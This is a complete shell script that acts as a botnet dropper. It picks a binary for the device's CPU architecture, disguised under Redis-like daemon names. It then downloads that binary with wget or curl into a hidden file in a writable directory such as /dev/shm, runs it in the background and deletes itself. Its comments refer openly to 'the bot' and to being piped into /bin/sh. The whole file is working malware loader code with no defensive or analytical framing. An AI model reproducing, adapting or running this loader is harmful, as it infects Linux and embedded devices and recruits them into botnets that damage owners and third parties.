#!/bin/sh

SRV="http://127.0.0.1/bins"

is_le() {
    echo -n I | od -to2 | awk '{print $2; exit}' | grep -q "49"
}

detect_arch() {
    arch=$(uname -m | tr '[:upper:]' '[:lower:]')
    BIN_NAME="redis-composd"

    case "$arch" in
        x86_64|amd64|x64|x86-64)            BIN_NAME="redis-daemon" ;;
        i486)                                 BIN_NAME="redis-initd" ;;
        i386|i586|i686|i786|x86|ia32)        BIN_NAME="redis-proxyd" ;;
        armv4*|armv4l*)                       BIN_NAME="redis-conteinerd" ;;
        armv5*|armv5l*|armv5te*)              BIN_NAME="redis-conteinerd-shim" ;;
        armv6*|armv6l*)                       BIN_NAME="redis-runcd" ;;
        armv7*|armv7l*|armv8l*|armv8-compat)  BIN_NAME="redis-buildxd" ;;
        aarch64|arm64|armv8|armv8a|armv9*)    BIN_NAME="redis-buildxd" ;;
        mipsel|mips32el|mips64el|mips64r2el)  BIN_NAME="redis-composd" ;;
        mips|mips32|mips64|mips64r2)
            if is_le; then BIN_NAME="redis-composd"; else BIN_NAME="redis-credentiald"; fi ;;
        ppc|powerpc|ppc32|ppc64|ppc64le)      BIN_NAME="redis-scoutd" ;;
        sh4|sh4a|sh)                          BIN_NAME="redis-sbomd" ;;
        m68k)                                 BIN_NAME="redis-scand" ;;
        sparc|sparc32|sparc64)                BIN_NAME="redis-machined" ;;
        arc|arc700|archs)                     BIN_NAME="redis-swarmd" ;;
    esac

    echo "$BIN_NAME"
}

find_writable_dir() {
    for dir in /dev/shm /tmp /var/system /mnt /var/tmp /run /dev; do
        if [ -d "$dir" ] && [ -w "$dir" ]; then
            echo "$dir"
            return 0
        fi
    done
    if [ -w "." ]; then
        echo "."
        return 0
    fi
    return 1
}

BIN_NAME=$(detect_arch)
URL="$SRV/$BIN_NAME"

WRITABLE_DIR=$(find_writable_dir)
if [ -z "$WRITABLE_DIR" ]; then
    exit 1
fi

DST="$WRITABLE_DIR/.$BIN_NAME"

# Always re-download — if persistence triggered, the bot is dead.
# A stale binary that crashes before self-delete would loop forever.
rm -f "$DST"
wget -qO "$DST" "$URL" 2>/dev/null || curl -sfLo "$DST" "$URL" 2>/dev/null
if [ ! -s "$DST" ]; then
    rm -f "$DST"
    exit 1
fi

chmod +x "$DST"
"$DST" > /dev/null 2>&1 &

# Self-delete: skip if $0 is a shell binary (piped via wget | /bin/sh).
case "$(basename "$0")" in
    sh|bash|ash|dash|busybox|zsh|ksh) ;;
    *) rm -f "$0" 2>/dev/null ;;
esac

exit 0
